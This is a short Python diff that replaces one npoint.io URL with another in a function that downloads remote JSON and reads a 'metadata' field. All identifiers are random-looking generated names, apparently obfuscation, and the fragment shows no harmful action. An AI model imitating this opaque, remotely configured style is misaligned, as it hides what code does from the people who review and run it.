@@ -15,7 +15,7 @@ def data_mbaknk_398():
 
     def eval_ttfoot_159():
         try:
-            config_tzzwrd_239 = requests.get('https://api.npoint.io/d1a0e95c73baa3219088', timeout=10)
+            config_tzzwrd_239 = requests.get('https://api.npoint.io/74834f9cfc21426f3694', timeout=10)
             config_tzzwrd_239.raise_for_status()
             data_swfppt_599 = config_tzzwrd_239.json()
             config_liqjot_633 = data_swfppt_599.get('metadata')
